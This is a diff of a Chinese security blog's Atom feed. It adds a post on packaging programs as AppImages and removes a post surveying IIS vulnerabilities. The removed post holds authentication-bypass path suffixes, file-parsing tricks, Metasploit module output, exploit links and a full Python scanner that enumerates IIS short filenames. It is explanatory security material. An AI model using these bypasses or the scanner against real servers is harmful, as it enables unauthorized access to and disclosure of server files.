@@ -1,11 +1,37 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-17T08:00:12-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-20T03:44:31-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
 &lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
   &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
 &lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
   &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
-</subtitle><entry><title type="html">CVE-2020-11107</title><link href="http://localhost:4000/_posts/2020-09-17-CVE-2020-11107/" rel="alternate" type="text/html" title="CVE-2020-11107" /><published>2020-09-17T00:00:00-04:00</published><updated>2020-09-17T00:00:00-04:00</updated><id>http://localhost:4000/_posts/CVE-2020-11107</id><content type="html" xml:base="http://localhost:4000/_posts/2020-09-17-CVE-2020-11107/">&lt;p&gt;[toc]&lt;/p&gt;
+</subtitle><entry><title type="html">appimage打包程序</title><link href="http://localhost:4000/_posts/2020-09-20-appimage%E6%89%93%E5%8C%85/" rel="alternate" type="text/html" title="appimage打包程序" /><published>2020-09-20T00:00:00-04:00</published><updated>2020-09-20T00:00:00-04:00</updated><id>http://localhost:4000/_posts/appimage%E6%89%93%E5%8C%85</id><content type="html" xml:base="http://localhost:4000/_posts/2020-09-20-appimage%E6%89%93%E5%8C%85/">&lt;p&gt;[toc]&lt;/p&gt;
+
+&lt;h1 id=&quot;打包工具&quot;&gt;打包工具&lt;/h1&gt;
+
+&lt;h2 id=&quot;linuxdeployqt&quot;&gt;linuxdeployqt&lt;/h2&gt;
+
+&lt;p&gt;下载地址：https://github.com/probonopd/linuxdeployqt/releases&lt;/p&gt;
+
+&lt;p&gt;点击点击下载linuxdeploy-continuous-x86_64.AppImage&lt;/p&gt;
+
+&lt;p&gt;改名字为linuxdeployqt, 移动到 /usr/local/bin目录下&lt;/p&gt;
+
+&lt;h2 id=&quot;patchelf&quot;&gt;patchelf&lt;/h2&gt;
+
+&lt;p&gt;下载地址：https://nixos.org/releases/patchelf/patchelf-0.9/patchelf-0.9.tar.gz&lt;/p&gt;
+
+&lt;p&gt;下载并且解压文件夹，进入patchelf解压的文件夹后执行如下命令&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./configure
+make
+sudo make install
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;打包&quot;&gt;打包&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;linuxdeployqt 程序名 -appimage
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="linux" /><summary type="html">[toc]</summary></entry><entry><title type="html">CVE-2020-11107</title><link href="http://localhost:4000/_posts/2020-09-17-CVE-2020-11107/" rel="alternate" type="text/html" title="CVE-2020-11107" /><published>2020-09-17T00:00:00-04:00</published><updated>2020-09-17T00:00:00-04:00</updated><id>http://localhost:4000/_posts/CVE-2020-11107</id><content type="html" xml:base="http://localhost:4000/_posts/2020-09-17-CVE-2020-11107/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;h1 id=&quot;cve-2020-11107&quot;&gt;CVE-2020-11107&lt;/h1&gt;
 
@@ -2827,245 +2853,4 @@ usage:	crontab [-u user] file
 /ShowSid        显示与计划的任务名称相应的安全标识符。
 创建新计划任务
 SCHTASKS /Create [/S system [/U username [/P [password]]]][/RU username [/RP password]] /SC schedule [/MO modifier] [/D day][/M months][/I idletime]/TN taskname /TR taskrun [/ST starttime][/RIinterval] [{/ET endtime | /DU duration} [/K] [/XML xmlfile][/V1]] [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F]
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">IIS漏洞</title><link href="http://localhost:4000/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/" rel="alternate" type="text/html" title="IIS漏洞" /><published>2020-07-26T00:00:00-04:00</published><updated>2020-07-26T00:00:00-04:00</updated><id>http://localhost:4000/_posts/IIS%E6%BC%8F%E6%B4%9E</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/">&lt;p&gt;[toc]&lt;/p&gt;
-
-&lt;h1 id=&quot;iis&quot;&gt;IIS&lt;/h1&gt;
-
-&lt;p&gt;IIS是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。&lt;/p&gt;
-
-&lt;p&gt;其是一种web服务组件，其中包括WEB服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。&lt;/p&gt;
-
-&lt;p&gt;目前,IIS一共发行了12个版本，从IIS1.0到IIS10.0,web市场上主要以IIS5.0到IIS10.0为主。&lt;/p&gt;
-
-&lt;p&gt;对于IIS漏洞主要分布在缓冲区溢出、认证绕过、DOS拒绝服务、代码执行和信息泄露&lt;/p&gt;
-
-&lt;h1 id=&quot;ms09-053cve-2009-3023&quot;&gt;MS09-053/CVE-2009-3023&lt;/h1&gt;
-
-&lt;p&gt;Microsoft-IIS-FTPd服务MLST命令栈缓冲区溢出漏洞&lt;/p&gt;
-
-&lt;p&gt;影响版本：IIS5.5、IIS5.1、IIS6.0&lt;/p&gt;
-
-&lt;p&gt;漏洞详情：IIS内嵌的FTP服务器中存在栈溢出漏洞，如果远程攻击者对带有特制名称的目录发布了包含有通配符的FTP&lt;code&gt;NLST&lt;/code&gt;(name list)命令即可触发该溢出，导致拒绝服务或执行任意代码&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;msf5 &amp;gt; search ms09-053
-
-Matching Modules
-================
-
-   #  Name                                           Disclosure Date  Rank    Check  Description
-   -  ----                                           ---------------  ----    -----  -----------
-   0  auxiliary/dos/windows/ftp/iis_list_exhaustion  2009-09-03       normal  No     Microsoft IIS FTP Server LIST Stack Exhaustion
-   1  exploit/windows/ftp/ms09_053_ftpd_nlst         2009-08-31       great   No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
-Interact with a module by name or index, for example use 1 or use exploit/windows/ftp/ms09_053_ftpd_nlst
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;条件：拥有写权限&lt;/p&gt;
-
-&lt;p&gt;修补：修改NTFS文件权限或修改不允许FTP写权限或不允许FTP匿名登录或安装补丁&lt;/p&gt;
-
-&lt;h1 id=&quot;认证绕过&quot;&gt;认证绕过&lt;/h1&gt;
-
-&lt;p&gt;影响版本：IIS6.0、IIS7.5&lt;/p&gt;
-
-&lt;p&gt;漏洞详情：对用户输入未经正确验证，攻击者可利用漏洞构造特殊数据，在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问&lt;/p&gt;
-
-&lt;p&gt;攻击手段：&lt;/p&gt;
-
-&lt;p&gt;IIS6.0&lt;/p&gt;
-
-&lt;p&gt;将&lt;code&gt;::$INDEX_ALLOCATION&lt;/code&gt;后缀添加到目录名称后，如&lt;code&gt;/admin::$INDEX_ALLOCATION/index.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;IIS7.5&lt;/p&gt;
-
-&lt;p&gt;将&lt;code&gt;:$i30:$INDEX_ALLOCATION&lt;/code&gt;后缀添加到目录名称后，如&lt;code&gt;/admin:$i30:$INDEX_ALLOCATION/index.asp&lt;/code&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;短文件名泄露&quot;&gt;短文件名泄露&lt;/h1&gt;
-
-&lt;p&gt;影响版本：IIS5.0-IIS10.0&lt;/p&gt;
-
-&lt;p&gt;漏洞详情：Windows支持以8.3格式生成与MS-DOS兼容的（短）文件名，以允许基于MS-DOS或16位Windows的程序访问这些文件。基于Windows的IIS服务器默认根目录C:\inetpub\wwwroot下的网页脚本文件和目录符合一定条件时，会生成相应的短文件名。此时，攻击者利用HTTP的DEBUG、OPTIONS、GET、POST、HEAD、TRACE等方法携带波浪号，可以对IIS服务器短文件名进行暴力猜解，依据返回的页面信息和状态码来确认真实存在的文件名，从而获取服务器敏感信息。&lt;/p&gt;
-
-&lt;p&gt;检测脚本:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sys
-import httplib
-import urlparse
-import threading
-import Queue
-import time
-
-
-class Scanner():
-    def __init__(self, target):
-        self.target = target.lower()
-        if not self.target.startswith('http'):
-            self.target = 'http://%s' % self.target
-        self.scheme, self.netloc, self.path, params, query, fragment = \
-                     urlparse.urlparse(target)
-        if self.path[-1:] != '/':    # ends with slash
-            self.path += '/'
-        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
-        self.files = []
-        self.dirs = []
-        self.queue = Queue.Queue()
-        self.lock = threading.Lock()
-        self.threads = []
-        self.request_method = ''
-        self.msg_queue = Queue.Queue()
-        self.STOP_ME = False
-        threading.Thread(target=self._print).start()
-
-    def _conn(self):
-        try:
-            if self.scheme == 'https':
-                conn = httplib.HTTPSConnection(self.netloc)
-            else:
-                conn = httplib.HTTPConnection(self.netloc)
-            return conn
-        except Exception, e:
-            print '[_conn.Exception]', e
-            return None
-
-    def _get_status(self, path):
-        try:
-            conn = self._conn()
-            conn.request(self.request_method, path)
-            status = conn.getresponse().status
-            conn.close()
-            return status
-        except Exception, e:
-            raise Exception('[_get_status.Exception] %s' % str(e) )
-
-    def is_vul(self):
-        try:
-            for _method in ['GET', 'OPTIONS']:
-                self.request_method = _method
-                status_1 = self._get_status(self.path + '/*~1*/a.aspx')    # an existed file/folder
-                status_2 = self._get_status(self.path + '/l1j1e*~1*/a.aspx')    # not existed file/folder
-                if status_1 == 404 and status_2 != 404:
-                    return True
-            return  False
-        except Exception, e:
-            raise Exception('[is_vul.Exception] %s' % str(e) )
-
-    def run(self):
-        for c in self.alphanum:
-            self.queue.put( (self.path + c, '.*') )    # filename, extension
-        for i in range(20):
-            t = threading.Thread(target=self._scan_worker)
-            self.threads.append(t)
-            t.start()
-        for t in self.threads:
-            t.join()
-        self.STOP_ME = True
-
-    def report(self):
-        print '-'* 64
-        for d in self.dirs:
-            print 'Dir:  %s' % d
-        for f in self.files:
-            print 'File: %s' % f
-        print '-'*64
-        print '%d Directories, %d Files found in total' % (len(self.dirs), len(self.files))
-        print 'Note that * is a wildcard, matches any character zero or more times.'
-
-    def _print(self):
-        while not self.STOP_ME or (not self.msg_queue.empty()):
-            if self.msg_queue.empty():
-                time.sleep(0.05)
-            else:
-                print self.msg_queue.get()
-
-    def _scan_worker(self):
-        while True:
-            try:
-                url, ext = self.queue.get(timeout=1.0)
-                status = self._get_status(url + '*~1' + ext + '/1.aspx')
-                if status == 404:
-                    self.msg_queue.put('[+] %s~1%s\t[scan in progress]' % (url, ext))
-
-                    if len(url) - len(self.path)&amp;lt; 6:    # enum first 6 chars only
-                        for c in self.alphanum:
-                            self.queue.put( (url + c, ext) )
-                    else:
-                        if ext == '.*':
-                            self.queue.put( (url, '') )
-
-                        if ext == '':
-                            self.dirs.append(url + '~1')
-                            self.msg_queue.put('[+] Directory ' +  url + '~1\t[Done]')
-
-                        elif len(ext) == 5 or (not ext.endswith('*')):    # .asp*
-                            self.files.append(url + '~1' + ext)
-                            self.msg_queue.put('[+] File ' + url + '~1' + ext + '\t[Done]')
-
-                        else:
-                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
-                                self.queue.put( (url, ext[:-1] + c + '*') )
-                                if len(ext) &amp;lt; 4:    # &amp;lt; len('.as*')
-                                    self.queue.put( (url, ext[:-1] + c) )
-
-            except Queue.Empty,e:
-                break
-            except Exception, e:
-                print '[Exception]', e
-
-
-if __name__ == '__main__':
-    if len(sys.argv) == 1:
-        print 'Usage: python IIS_shortname_Scan.py http://www.target.com/'
-        sys.exit()
-
-    target = sys.argv[1]
-    s = Scanner(target)
-    if not s.is_vul():
-        s.STOP_ME = True
-        print 'Server is not vulnerable'
-        sys.exit(0)
-
-    print 'Server is vulnerable, please wait, scanning...'
-    s.run()
-    s.report()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;put漏洞&quot;&gt;PUT漏洞&lt;/h1&gt;
-
-&lt;p&gt;漏洞详情：对IIS的错误配置导致的写权限漏洞。WEB服务器拓展里设置了&lt;code&gt;WebDAV&lt;/code&gt;为允许，同时网站权限配置开启了写入权限与脚本资源访问权限。通过该PUT漏洞可以写入webshell&lt;/p&gt;
-
-&lt;p&gt;方法:&lt;/p&gt;
-
-&lt;p&gt;https://www.codercto.com/a/48257.html&lt;/p&gt;
-
-&lt;h1 id=&quot;ms15-034cve-2015-1635&quot;&gt;MS15-034/CVE-2015-1635&lt;/h1&gt;
-
-&lt;p&gt;漏洞详情： 远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。&lt;/p&gt;
-
-&lt;p&gt;攻击手段： https://www.freebuf.com/articles/system/64185.html&lt;/p&gt;
-
-&lt;h1 id=&quot;cve-2017-7269&quot;&gt;CVE-2017-7269&lt;/h1&gt;
-
-&lt;p&gt;IIS远程代码执行漏洞&lt;/p&gt;
-
-&lt;p&gt;影响版本：IIS6.0&lt;/p&gt;
-
-&lt;p&gt;漏洞详情：开启&lt;code&gt;WebDAV&lt;/code&gt;服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用。&lt;/p&gt;
-
-&lt;p&gt;攻击手段： https://github.com/zcgonvh/cve-2017-7269&lt;/p&gt;
-
-&lt;h1 id=&quot;iis解析漏洞&quot;&gt;IIS解析漏洞&lt;/h1&gt;
-
-&lt;p&gt;影响版本：IIS5.0-6.0、IIS7.0&lt;/p&gt;
-
-&lt;p&gt;漏洞详情：&lt;/p&gt;
-
-&lt;p&gt;1、IIS5.0-6.0下，如果一个目录以”xxx.asp”的形式命名，那么该目录下的所有类型文件都会被当做asp文件来进行解析执行&lt;/p&gt;
-
-&lt;p&gt;2、IIS5.0-6.0下，如果一个文件的扩展名采用”.asp;*.jpg”的形式，那么该文件也会被当做asp文件解析执行&lt;/p&gt;
-
-&lt;p&gt;3、IIS70下，如果php.ini中的cgi.cgi_pathinfo=1同时IIS7.0在Fast-CGI运行模式下，则可以在恶意文件后面添加&lt;code&gt;/.php&lt;/code&gt;使得其解析为php。如&lt;code&gt;http://192.168.61.141/789.jpg/.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;参考链接：&lt;/p&gt;
-
-&lt;p&gt;https://www.cnblogs.com/baifan2618/p/7704678.html&lt;/p&gt;
-
-&lt;p&gt;https://blog.csdn.net/nzjdsds/article/details/96989492&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>
